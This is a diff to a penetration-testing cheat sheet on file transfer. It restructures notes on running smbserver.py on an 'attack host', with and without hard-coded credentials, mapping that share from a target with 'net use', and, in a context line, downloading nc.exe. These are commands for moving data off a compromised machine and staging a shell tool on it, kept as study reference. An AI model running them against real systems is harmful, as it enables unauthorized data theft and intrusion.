@@ -60,8 +60,13 @@ Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUser
 ## Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
 ```
 python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
-# OR with password support if the previous command failed because GPO blocks anonymous connection
+```
+
+## Uses smbserver.py with password support (in case GPO blocks anonymous access) to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
+```
 python3 smbserver.py -username snovvcrash -password 'Passw0rd!' -smb2support share $(pwd)
-# Then in powershell, mount the disk
+```
+## Mount disk on a drive
+```
 Cmd > net use Z: \\10.10.14.153\share /u:snovvcrash 'Passw0rd!'
 ```
